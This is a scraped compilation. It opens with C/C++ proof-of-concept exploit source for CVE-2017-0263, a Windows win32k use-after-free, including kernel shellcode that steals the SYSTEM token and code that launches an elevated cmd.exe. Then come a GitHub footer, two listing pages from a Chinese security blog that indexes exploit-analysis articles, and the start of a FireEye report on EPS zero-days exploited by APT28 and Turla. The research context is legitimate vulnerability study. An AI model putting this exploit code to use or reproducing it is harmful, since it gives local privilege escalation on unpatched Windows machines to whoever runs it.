0x0b, // mov ecx,dword ptr [ebx+ecx] 0x2b, 0xcb, // sub ecx,ebx 0xeb, 0xf3, // jmp Loader+0x10f0 // Loader+0x10fd: // Get current EPROCESS to EDI. 0x8b, 0xf9, // mov edi,ecx 0x59, // pop ecx // Loader+0x1100: // Judge if EPROCESS->UniqueId == 4 0x83, 0x7c, 0x0b, 0xfc, 0x04, // cmp dword ptr [ebx+ecx-4],4 0x74, 0x07, // je Loader+0x110e // Loader+0x1107: // Get next EPROCESS to ECX by ActiveLink. 0x8b, 0x0c, 0x0b, // mov ecx,dword ptr [ebx+ecx] 0x2b, 0xcb, // sub ecx,ebx 0xeb, 0xf2, // jmp Loader+0x1100 // Loader+0x110e: // Get system EPROCESS to ESI. // Get the value of system EPROCESS->Token to current EPROCESS->Token. // Add 2 to OBJECT\_HEADER->PointerCount of system Token. // Return 0x9F9F to the caller. 0x8b, 0xf1, // mov esi,ecx 0x8b, 0x42, 0x14, // mov eax,dword ptr [edx+14h] 0x03, 0xf0, // add esi,eax 0x03, 0xf8, // add edi,eax 0xad, // lods dword ptr [esi] 0xab, // stos dword ptr es:[edi] 0x83, 0xe0, 0xf8, // and eax,0FFFFFFF8h 0x83, 0x40, 0xe8, 0x02, // add dword ptr [eax-18h],2 0x61, // popad 0xb8, 0x9f, 0x9f, 0x00, 0x00, // mov eax,9F9Fh 0xeb, 0x05, // jmp Loader+0x112d // Loader+0x1128: // Failed in processing. 0xb8, 0x01, 0x00, 0x00, 0x00, // mov eax,1 // Loader+0x112d: 0xc9, // leave 0xc2, 0x10, 0x00, // ret 10h};
staticVOIDxxGetHMValidateHandle(VOID){ HMODULE hModule = LoadLibraryA("USER32.DLL"); PBYTE pfnIsMenu = (PBYTE)GetProcAddress(hModule, "IsMenu"); PBYTE Address = NULL; for (INT i = 0; i < 0x30; i++) { if (\*(WORD \*)(i + pfnIsMenu) != 0x02B2) { continue; } i += 2; if (\*(BYTE \*)(i + pfnIsMenu) != 0xE8) { continue; } Address = \*(DWORD \*)(i + pfnIsMenu + 1) + pfnIsMenu; Address = Address + i + 5; pfnHMValidateHandle = (PVOID(\_\_fastcall \*)(HANDLE, BYTE))Address; break; }}
#define TYPE\_WINDOW 1
staticPVOIDxxHMValidateHandleEx(HWND hwnd){ return pfnHMValidateHandle((HANDLE)hwnd, TYPE\_WINDOW);}
staticPVOIDxxHMValidateHandle(HWND hwnd){ PVOID RetAddr = NULL; if (!pfnHMValidateHandle) { xxGetHMValidateHandle(); } if (pfnHMValidateHandle) { RetAddr = xxHMValidateHandleEx(hwnd); } return RetAddr;}
staticVOID\_\_declspec(naked)xxNtUserMNDragLeave(VOID){ \_\_asm { mov eax, 11ECh }; \_\_asm { int 2eh }; \_\_asm { ret };}
staticLRESULTWINAPIxxShadowWindowProc( \_In\_ HWND hwnd, \_In\_ UINT msg, \_In\_ WPARAM wParam, \_In\_ LPARAM lParam){ if (msg != WM\_NCDESTROY || bDoneExploit) { return DefWindowProcW(hwnd, msg, wParam, lParam); } std::cout << "::" << \_\_FUNCTION\_\_ << std::endl; POCDEBUG\_BREAK(); DWORD dwPopupFake[0xD] = { 0 }; dwPopupFake[0x0] = (DWORD)0x00098208; //->flags dwPopupFake[0x1] = (DWORD)pvHeadFake; //->spwndNotify dwPopupFake[0x2] = (DWORD)pvHeadFake; //->spwndPopupMenu dwPopupFake[0x3] = (DWORD)pvHeadFake; //->spwndNextPopup dwPopupFake[0x4] = (DWORD)pvAddrFlags - 4; //->spwndPrevPopup dwPopupFake[0x5] = (DWORD)pvHeadFake; //->spmenu dwPopupFake[0x6] = (DWORD)pvHeadFake; //->spmenuAlternate dwPopupFake[0x7] = (DWORD)pvHeadFake; //->spwndActivePopup dwPopupFake[0x8] = (DWORD)0xFFFFFFFF; //->ppopupmenuRoot dwPopupFake[0x9] = (DWORD)pvHeadFake; //->ppmDelayedFree dwPopupFake[0xA] = (DWORD)0xFFFFFFFF; //->posSelectedItem dwPopupFake[0xB] = (DWORD)pvHeadFake; //->posDropped dwPopupFake[0xC] = (DWORD)0; for (UINT i = 0; i < iWindowCount; ++i) { SetClassLongW(hWindowList[i], GCL\_MENUNAME, (LONG)dwPopupFake); } xxNtUserMNDragLeave(); LRESULT Triggered = SendMessageW(hWindowHunt, 0x9F9F, popupMenuRoot, 0); bDoneExploit = Triggered == 0x9F9F; return DefWindowProcW(hwnd, msg, wParam, lParam);}
#define MENUCLASS\_NAME L"#32768"
staticLRESULTCALLBACKxxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam){ tagCWPSTRUCT \*cwp = (tagCWPSTRUCT \*)lParam; static HWND hwndMenuHit = 0; static UINT iShadowCount = 0;
 if (bDoneExploit || iMenuCreated != num\_PopupMenuCount - 2 || cwp->message != WM\_NCCREATE) { return CallNextHookEx(0, code, wParam, lParam); } std::cout << "::" << \_\_FUNCTION\_\_ << std::endl; WCHAR szTemp[0x20] = { 0 }; GetClassNameW(cwp->hwnd, szTemp, 0x14); if (!wcscmp(szTemp, L"SysShadow") && hwndMenuHit != NULL) { std::cout << "::iShadowCount=" << iShadowCount << std::endl; POCDEBUG\_BREAK(); if (++iShadowCount == num\_WndShadowCount) { SetWindowLongW(cwp->hwnd, GWL\_WNDPROC, (LONG)xxShadowWindowProc); } else { SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP\_NOSIZE | SWP\_NOMOVE | SWP\_NOZORDER | SWP\_HIDEWINDOW); SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP\_NOSIZE | SWP\_NOMOVE | SWP\_NOZORDER | SWP\_SHOWWINDOW); } } else if (!wcscmp(szTemp, MENUCLASS\_NAME)) { hwndMenuHit = cwp->hwnd; std::cout << "::hwndMenuHit=" << hwndMenuHit << std::endl; } return CallNextHookEx(0, code, wParam, lParam);}
#define MN\_ENDMENU 0x1F3
staticVOIDCALLBACKxxWindowEventProc( HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime){ UNREFERENCED\_PARAMETER(hWinEventHook); UNREFERENCED\_PARAMETER(event); UNREFERENCED\_PARAMETER(idObject); UNREFERENCED\_PARAMETER(idChild); UNREFERENCED\_PARAMETER(idEventThread); UNREFERENCED\_PARAMETER(dwmsEventTime); std::cout << "::" << \_\_FUNCTION\_\_ << std::endl; if (iMenuCreated == 0) { popupMenuRoot = \*(DWORD \*)((PBYTE)xxHMValidateHandle(hwnd) + 0xb0); } if (++iMenuCreated >= num\_PopupMenuCount) { std::cout << ">>SendMessage(MN\_ENDMENU)" << std::endl; POCDEBUG\_BREAK(); SendMessageW(hwnd, MN\_ENDMENU, 0, 0); } else { std::cout << ">>SendMessage(WM\_LBUTTONDOWN)" << std::endl; POCDEBUG\_BREAK(); SendMessageW(hwnd, WM\_LBUTTONDOWN, 1, 0x00020002); }}
staticBOOLxxRegisterWindowClassW(LPCWSTR lpszClassName, INT cbWndExtra){ WNDCLASSEXW wndClass = { 0 }; wndClass = { 0 }; wndClass.cbSize = sizeof(WNDCLASSEXW); wndClass.lpfnWndProc = DefWindowProcW; wndClass.cbWndExtra = cbWndExtra; wndClass.hInstance = GetModuleHandleA(NULL); wndClass.lpszMenuName = NULL; wndClass.lpszClassName = lpszClassName; return RegisterClassExW(&wndClass);}
staticHWNDxxCreateWindowExW(LPCWSTR lpszClassName, DWORD dwExStyle, DWORD dwStyle){ return CreateWindowExW(dwExStyle, lpszClassName, NULL, dwStyle, 0, 0, 1, 1, NULL, NULL, GetModuleHandleA(NULL), NULL);}
staticVOID xxCreateCmdLineProcess(VOID){ STARTUPINFO si = { sizeof(si) }; PROCESS\_INFORMATION pi = { 0 }; si.dwFlags = STARTF\_USESHOWWINDOW; si.wShowWindow = SW\_SHOW; WCHAR wzFilePath[MAX\_PATH] = { L"cmd.exe" }; BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE\_NEW\_CONSOLE, NULL, NULL, &si, &pi); if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);}
staticDWORDWINAPIxxTrackExploitEx(LPVOID lpThreadParameter){ UNREFERENCED\_PARAMETER(lpThreadParameter); std::cout << "::" << \_\_FUNCTION\_\_ << std::endl; POCDEBUG\_BREAK();
 for (INT i = 0; i < num\_PopupMenuCount; i++) { MENUINFO mi = { 0 }; hpopupMenu[i] = CreatePopupMenu(); mi.cbSize = sizeof(mi); mi.fMask = MIM\_STYLE; mi.dwStyle = MNS\_AUTODISMISS | MNS\_MODELESS | MNS\_DRAGDROP; SetMenuInfo(hpopupMenu[i], &mi); } for (INT i = 0; i < num\_PopupMenuCount; i++) { LPCSTR szMenuItem = "item"; AppendMenuA(hpopupMenu[i], MF\_BYPOSITION | MF\_POPUP, (i >= num\_PopupMenuCount - 1) ? 0 : (UINT\_PTR)hpopupMenu[i + 1], szMenuItem); }
 for (INT i = 0; i < 0x100; i++) { WNDCLASSEXW Class = { 0 }; WCHAR szTemp[20] = { 0 }; HWND hwnd = NULL; wsprintfW(szTemp, L"%x-%d", rand(), i); Class.cbSize = sizeof(WNDCLASSEXA); Class.lpfnWndProc = DefWindowProcW; Class.cbWndExtra = 0; Class.hInstance = GetModuleHandleA(NULL); Class.lpszMenuName = NULL; Class.lpszClassName = szTemp; if (!RegisterClassExW(&Class)) { continue; } hwnd = CreateWindowExW(0, szTemp, NULL, WS\_OVERLAPPED, 0, 0, 0, 0, NULL, NULL, GetModuleHandleA(NULL), NULL); if (hwnd == NULL) { continue; } hWindowList[iWindowCount++] = hwnd; } for (INT i = 0; i < iWindowCount; i++) { pvShellCode->tagCLS[i] = \*(PVOID \*)((PBYTE)xxHMValidateHandle(hWindowList[i]) + num\_offset\_WND\_pcls); }
 DWORD fOldProtect = 0; VirtualProtect(pvShellCode, 0x1000, PAGE\_EXECUTE\_READ, &fOldProtect);
 xxRegisterWindowClassW(L"WNDCLASSMAIN", 0x000); hWindowMain = xxCreateWindowExW(L"WNDCLASSMAIN", WS\_EX\_LAYERED | WS\_EX\_TOOLWINDOW | WS\_EX\_TOPMOST, WS\_VISIBLE); xxRegisterWindowClassW(L"WNDCLASSHUNT", 0x200); hWindowHunt = xxCreateWindowExW(L"WNDCLASSHUNT", WS\_EX\_LEFT, WS\_OVERLAPPED); PTHRDESKHEAD head = (PTHRDESKHEAD)xxHMValidateHandle(hWindowHunt); PBYTE pbExtra = head->deskhead.pSelf + 0xb0 + 4; pvHeadFake = pbExtra + 0x44; for (UINT x = 0; x < 0x7F; x++) { SetWindowLongW(hWindowHunt, sizeof(DWORD) \* (x + 1), (LONG)pbExtra); } PVOID pti = head->thread.pti; SetWindowLongW(hWindowHunt, 0x28, 0); SetWindowLongW(hWindowHunt, 0x50, (LONG)pti); // pti SetWindowLongW(hWindowHunt, 0x6C, 0); SetWindowLongW(hWindowHunt, 0x1F8, 0xC033C033); SetWindowLongW(hWindowHunt, 0x1FC, 0xFFFFFFFF);
 pvAddrFlags = \*(PBYTE \*)((PBYTE)xxHMValidateHandle(hWindowHunt) + 0x10) + 0x16;
 SetWindowLongW(hWindowHunt, GWL\_WNDPROC, (LONG)pvShellCode->pfnWindProc);
 SetWindowsHookExW(WH\_CALLWNDPROC, xxWindowHookProc, GetModuleHandleA(NULL), GetCurrentThreadId());
 SetWinEventHook(EVENT\_SYSTEM\_MENUPOPUPSTART, EVENT\_SYSTEM\_MENUPOPUPSTART, GetModuleHandleA(NULL), xxWindowEventProc, GetCurrentProcessId(), GetCurrentThreadId(), 0);
 TrackPopupMenuEx(hpopupMenu[0], 0, 0, 0, hWindowMain, NULL);
 MSG msg = { 0 }; while (GetMessageW(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); } return 0;}
INT POC\_CVE20170263(VOID){ std::cout << "-------------------" << std::endl; std::cout << "POC - CVE-2017-0263" << std::endl; std::cout << "-------------------" << std::endl;
 pvShellCode = (PSHELLCODE)VirtualAlloc(NULL, 0x1000, MEM\_COMMIT | MEM\_RESERVE, PAGE\_EXECUTE\_READWRITE); if (pvShellCode == NULL) { return 0; } ZeroMemory(pvShellCode, 0x1000); pvShellCode->pid = GetCurrentProcessId(); pvShellCode->off\_CLS\_lpszMenuName = 0x050; pvShellCode->off\_THREADINFO\_ppi = 0x0b8; pvShellCode->off\_EPROCESS\_ActiveLink = 0x0b8; pvShellCode->off\_EPROCESS\_Token = 0x0f8; CopyMemory(pvShellCode->pfnWindProc, xxPayloadWindProc, sizeof(xxPayloadWindProc));
 std::cout << "CREATE WORKER THREAD..." << std::endl; POCDEBUG\_BREAK(); HANDLE hThread = CreateThread(NULL, 0, xxTrackExploitEx, NULL, 0, NULL); if (hThread == NULL) { return FALSE; } while (!bDoneExploit) { Sleep(500); } xxCreateCmdLineProcess(); DestroyWindow(hWindowMain); TerminateThread(hThread, 0); std::cout << "-------------------" << std::endl; getchar(); return bDoneExploit;}
INT main(INT argc, CHAR \*argv[]){ POC\_CVE20170263(); return 0;}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from xiaodaozhi.com_d5a221f4_20250126_091021.html ===

小刀志
[首页](/ "首页 home")
[归档](https://xiaodaozhi.com/archives.html "归档 archives")
[标签](https://xiaodaozhi.com/tags.html "标签 tags")
[链接](https://xiaodaozhi.com/links.html "链接 links")
[我是谁](https://xiaodaozhi.com/who-am-i.html "我是谁 whoami")

![小刀志](/img/author.png)
小刀志

稻草小刀的在线笔记。记录所有事情，并写给自己。

搜索关键字

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-11

[Win32k NULL-Pointer-Dereference Analysis by Matching the May Update](https://xiaodaozhi.com/exploit/156.html)
Microsoft shipped and fixed four win32k kernel Escalation of Privilege vulnerabilities in the May security bulletin. ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [78682](https://xiaodaozhi.com/exploit/156.html)
* [1](https://xiaodaozhi.com/exploit/156.html#comments)
* 28

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-09

[通过对比 5 月补丁分析 win32k 空指针解引用漏洞](https://xiaodaozhi.com/exploit/149.html)
微软在 5 月安全公告中包含并修复了 4 个 win32k 内核提权漏洞。这篇文章将通过补丁对比的方式，发现并分析补丁程序中修复的一个由某处空指针解引用导致的提权漏洞，最终实现其验证和利用代码。分析和调试的过程将在 Windows ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [48111](https://xiaodaozhi.com/exploit/149.html)
* [3](https://xiaodaozhi.com/exploit/149.html#comments)
* 10

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-09

[对 UAF 漏洞 CVE-2016-0167 的分析和利用](https://xiaodaozhi.com/exploit/135.html)
这篇文章将对 Windows 释放后重用（UAF）内核漏洞 CVE-2016-0167 进行一次简单的分析并构造其利用验证代码。该漏洞在 2016 年据报道称被用于攻击支付卡等目标的数据，并和之前分析的 CVE-2016-0165 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [46863](https://xiaodaozhi.com/exploit/135.html)
* [8](https://xiaodaozhi.com/exploit/135.html#comments)
* 6

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-22

[CVE-2015-2546 UAF Analysis and Exploitation](https://xiaodaozhi.com/exploit/132.html)
This article will analyze a UAF vulnerability in win32k Window Manager (User) Subsystem in Windows: CVE-2015-2546. S ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [38327](https://xiaodaozhi.com/exploit/132.html)
* [0](https://xiaodaozhi.com/exploit/132.html#comments)
* 2

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-18

[对 UAF 漏洞 CVE-2015-2546 的分析和利用](https://xiaodaozhi.com/exploit/122.html)
这篇文章将分析 Windows 操作系统 win32k 内核模块窗口管理器子系统中的 CVE-2015-2546 漏洞，与上一篇分析的 CVE-2017-0263 漏洞类似地，这个漏洞也是弹出菜单 tagPOPUPMENU 对象的释 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [42661](https://xiaodaozhi.com/exploit/122.html)
* [0](https://xiaodaozhi.com/exploit/122.html#comments)
* 5

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-12

[From CVE-2017-0263 To Windows Menu Management Component](https://xiaodaozhi.com/exploit/117.html)
CVE-2017-0263 is a UAF vulnerability in Menu Management Component in win32k kernel module of Windows operating syste ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [59912](https://xiaodaozhi.com/exploit/117.html)
* [0](https://xiaodaozhi.com/exploit/117.html#comments)
* 6

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-10

[从 CVE-2017-0263 漏洞分析到 Windows 菜单管理组件](https://xiaodaozhi.com/exploit/71.html)
CVE-2017-0263 是 Windows 操作系统 win32k 内核模块菜单管理组件中的一个 UAF（释放后重用）漏洞，据报道称该漏洞在之前与一个 EPS 漏洞被 APT28 组织组合攻击用来干涉法国大选。这篇文章将对用于这 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [68476](https://xiaodaozhi.com/exploit/71.html)
* [18](https://xiaodaozhi.com/exploit/71.html#comments)
* 21

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-02-06

[分析笔记：MS17-017 中的整数溢出漏洞](https://xiaodaozhi.com/exploit/70.html)
前面的文章分析了 CVE-2016-0165 整数上溢漏洞，这篇文章继续分析另一个同样发生在 GDI 子系统的一个整数向上溢出漏洞（在分析此漏洞时，误以为此漏洞是 MS17-017 公告中的 CVE-2017-0101 漏洞，近期根 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [57577](https://xiaodaozhi.com/exploit/70.html)
* [22](https://xiaodaozhi.com/exploit/70.html#comments)
* 4

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-01-29

[从 CVE-2016-0165 说起：分析、利用和检测（下）](https://xiaodaozhi.com/exploit/56.html)
本文将对 CVE-2016-0165 (MS16-039) 漏洞进行一次简单的分析，并尝试构造其漏洞利用和内核提权验证代码，以及实现对应利用样本的检测逻辑。分析环境为 Windows 7 x86 SP1 基础环境的虚拟机，配置 1. ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [17884](https://xiaodaozhi.com/exploit/56.html)
* [0](https://xiaodaozhi.com/exploit/56.html#comments)
* 2

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-01-28

[从 CVE-2016-0165 说起：分析、利用和检测（中）](https://xiaodaozhi.com/exploit/42.html)
本文将对 CVE-2016-0165 (MS16-039) 漏洞进行一次简单的分析，并尝试构造其漏洞利用和内核提权验证代码，以及实现对应利用样本的检测逻辑。分析环境为 Windows 7 x86 SP1 基础环境的虚拟机，配置 1. ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [16169](https://xiaodaozhi.com/exploit/42.html)
* [8](https://xiaodaozhi.com/exploit/42.html#comments)
* 3

1. [1](https://xiaodaozhi.com/exploit/1/)
2. [2](https://xiaodaozhi.com/exploit/2/)
3. [下一页](https://xiaodaozhi.com/exploit/2/)

© 2025 [小刀志](https://xiaodaozhi.com/)
*·* [网站地图](https://xiaodaozhi.com/sitemap.xml)
*·* [许可声明](https://xiaodaozhi.com/license.html)
*·* [京ICP备18017134号-1](https://beian.miit.gov.cn/) *·* 京公网安备11010502035375号



=== Content from xiaodaozhi.com_ad2a0de2_20250126_091023.html ===

小刀志
[首页](/ "首页 home")
[归档](https://xiaodaozhi.com/archives.html "归档 archives")
[标签](https://xiaodaozhi.com/tags.html "标签 tags")
[链接](https://xiaodaozhi.com/links.html "链接 links")
[我是谁](https://xiaodaozhi.com/who-am-i.html "我是谁 whoami")

![小刀志](/img/author.png)
小刀志

稻草小刀的在线笔记。记录所有事情，并写给自己。

搜索关键字

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2022-08-16

[基于海量样本数据的高级威胁发现](https://xiaodaozhi.com/security/195.html)
“看见”的能力始终伴随着“不看见”的能力，正如“太极”的两部分。什么是看见？看见一片大海、一片星空、一片沙漠，是看见吗？正是由于有选择的不看见的能力，忽略过滤排除筛选，去除大量无效信息，才能拨云见日、从茫茫大海星空沙漠中看见更加有价 ...

* [安全](https://xiaodaozhi.com/security/)
* [24782](https://xiaodaozhi.com/security/195.html)
* [2](https://xiaodaozhi.com/security/195.html#comments)
* 4

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2021-08-19

[丰富化威胁情报平台的能力](https://xiaodaozhi.com/security/172.html)
翻译自英文文章：《Enriching Threat Intelligence Platforms Capabilities》。文章讲述一个丰富化的威胁情报平台的实现思路，以扩展当前 TIP 中的导入、质量评估过程和信息共享功能。原文 ...

* [安全](https://xiaodaozhi.com/security/)
* [44368](https://xiaodaozhi.com/security/172.html)
* [1](https://xiaodaozhi.com/security/172.html#comments)
* 5

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-11

[Win32k NULL-Pointer-Dereference Analysis by Matching the May Update](https://xiaodaozhi.com/exploit/156.html)
Microsoft shipped and fixed four win32k kernel Escalation of Privilege vulnerabilities in the May security bulletin. ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [78682](https://xiaodaozhi.com/exploit/156.html)
* [1](https://xiaodaozhi.com/exploit/156.html#comments)
* 28

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-09

[通过对比 5 月补丁分析 win32k 空指针解引用漏洞](https://xiaodaozhi.com/exploit/149.html)
微软在 5 月安全公告中包含并修复了 4 个 win32k 内核提权漏洞。这篇文章将通过补丁对比的方式，发现并分析补丁程序中修复的一个由某处空指针解引用导致的提权漏洞，最终实现其验证和利用代码。分析和调试的过程将在 Windows ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [48111](https://xiaodaozhi.com/exploit/149.html)
* [3](https://xiaodaozhi.com/exploit/149.html#comments)
* 10

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-09

[对 UAF 漏洞 CVE-2016-0167 的分析和利用](https://xiaodaozhi.com/exploit/135.html)
这篇文章将对 Windows 释放后重用（UAF）内核漏洞 CVE-2016-0167 进行一次简单的分析并构造其利用验证代码。该漏洞在 2016 年据报道称被用于攻击支付卡等目标的数据，并和之前分析的 CVE-2016-0165 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [46863](https://xiaodaozhi.com/exploit/135.html)
* [8](https://xiaodaozhi.com/exploit/135.html#comments)
* 6

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-22

[CVE-2015-2546 UAF Analysis and Exploitation](https://xiaodaozhi.com/exploit/132.html)
This article will analyze a UAF vulnerability in win32k Window Manager (User) Subsystem in Windows: CVE-2015-2546. S ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [38327](https://xiaodaozhi.com/exploit/132.html)
* [0](https://xiaodaozhi.com/exploit/132.html#comments)
* 2

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-18

[对 UAF 漏洞 CVE-2015-2546 的分析和利用](https://xiaodaozhi.com/exploit/122.html)
这篇文章将分析 Windows 操作系统 win32k 内核模块窗口管理器子系统中的 CVE-2015-2546 漏洞，与上一篇分析的 CVE-2017-0263 漏洞类似地，这个漏洞也是弹出菜单 tagPOPUPMENU 对象的释 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [42661](https://xiaodaozhi.com/exploit/122.html)
* [0](https://xiaodaozhi.com/exploit/122.html#comments)
* 5

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-12

[From CVE-2017-0263 To Windows Menu Management Component](https://xiaodaozhi.com/exploit/117.html)
CVE-2017-0263 is a UAF vulnerability in Menu Management Component in win32k kernel module of Windows operating syste ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [59912](https://xiaodaozhi.com/exploit/117.html)
* [0](https://xiaodaozhi.com/exploit/117.html#comments)
* 6

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-10

[从 CVE-2017-0263 漏洞分析到 Windows 菜单管理组件](https://xiaodaozhi.com/exploit/71.html)
CVE-2017-0263 是 Windows 操作系统 win32k 内核模块菜单管理组件中的一个 UAF（释放后重用）漏洞，据报道称该漏洞在之前与一个 EPS 漏洞被 APT28 组织组合攻击用来干涉法国大选。这篇文章将对用于这 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [68476](https://xiaodaozhi.com/exploit/71.html)
* [18](https://xiaodaozhi.com/exploit/71.html#comments)
* 21

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-02-06

[分析笔记：MS17-017 中的整数溢出漏洞](https://xiaodaozhi.com/exploit/70.html)
前面的文章分析了 CVE-2016-0165 整数上溢漏洞，这篇文章继续分析另一个同样发生在 GDI 子系统的一个整数向上溢出漏洞（在分析此漏洞时，误以为此漏洞是 MS17-017 公告中的 CVE-2017-0101 漏洞，近期根 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [57577](https://xiaodaozhi.com/exploit/70.html)
* [22](https://xiaodaozhi.com/exploit/70.html#comments)
* 4

1. [1](https://xiaodaozhi.com/author/1/1/)
2. [2](https://xiaodaozhi.com/author/1/2/)
3. [3](https://xiaodaozhi.com/author/1/3/)
4. [下一页](https://xiaodaozhi.com/author/1/2/)

© 2025 [小刀志](https://xiaodaozhi.com/)
*·* [网站地图](https://xiaodaozhi.com/sitemap.xml)
*·* [许可声明](https://xiaodaozhi.com/license.html)
*·* [京ICP备18017134号-1](https://beian.miit.gov.cn/) *·* 京公网安备11010502035375号



=== Content from www.fireeye.com_26fd1a4e_20250126_091008.html ===
Threat Intelligence
# EPS Processing Zero-Days Exploited by Multiple Threat Actors

May 9, 2017

##### Mandiant

Written by: Genwei Jiang, Alex Lanstein, Alex Berry, Ben Read, Dhanesh Kizhakkinan, Greg Macmanus

---

In 2015, FireEye published details about two attacks exploiting vulnerabilities in Encapsulated PostScript (EPS) of Microsoft Office. One was a [zero-day](https://www.fireeye.com/blog/threat-research/2015/09/attack_exploitingmi.html) and one was [patched](https://www.mandiant.com/blog/threat-research/2015/12/the_eps_awakens.html) weeks before the attack launched.

Recently, FireEye identified three new zero-day vulnerabilities in Microsoft Office products that are being exploited in the wild.

At the end of March 2017, we detected another malicious document leveraging an unknown vulnerability in EPS and a recently [patched](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0001) vulnerability in Windows Graphics Device Interface (GDI) to drop malware. Following the April 2017 Patch Tuesday, in which Microsoft disabled EPS, FireEye detected a second unknown vulnerability in EPS.

FireEye believes that two actors – [Turla](https://www.fireeye.com/content/dam/fireeye-www/company/events/infosec/threat-landscape-overview-fireeye-summit-paris.pdf) and an unknown financially motivated actor – were using the first EPS zero-day ([CVE-2017-0261](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0261)), and [APT28](https://www.mandiant.com/resources/apt28-window-russias-cyber-espionage-operations) was using the second EPS zero-day ([CVE-2017-0262](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0262)) along with a new Escalation of Privilege (EOP) zero-day ([CVE-2017-0263](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0263)). Turla and APT28 are Russian cyber espionage groups that have used these zero-days against European diplomatic and military entities. The unidentified financial group targeted regional and global banks with offices in the Middle East. The following is a description of the EPS zero-days, associated malware, and the new EOP zero-day. Each EPS zero-day is accompanied by an EOP exploit, with the EOP being required to escape the sandbox that executes the FLTLDR.EXE instance used for EPS processing.

The malicious documents have been used to deliver three different payloads. CVE-2017-0261 was used to deliver SHIRIME (Turla) and NETWIRE (unknown financially motivated actor), and CVE-2017-0262 was used to deliver GAMEFISH (APT28). CVE-2017-0263 is used to escalate privileges during the delivery of the GAMEFISH payload.

FireEye email and network products detected the malicious documents.

FireEye has been coordinating with the Microsoft Security Response Center (MSRC) for the responsible disclosure of this information. Microsoft advises all customers to follow the guidance in [security advisory ADV170005](https://msrc.microsoft.com/update-guide/en-US/vulnerability/ADV170005) as a defense-in-depth measure against EPS filter vulnerabilities.

#### CVE-2017-0261 – EPS *"restore"* Use-After-Free

Upon opening the Office document, the FLTLDR.EXE is utilized to render an embedded EPS image, which contains the exploit. The EPS file is a PostScript program, which leverages a Use-After-Free vulnerability in “*restore*” operand.

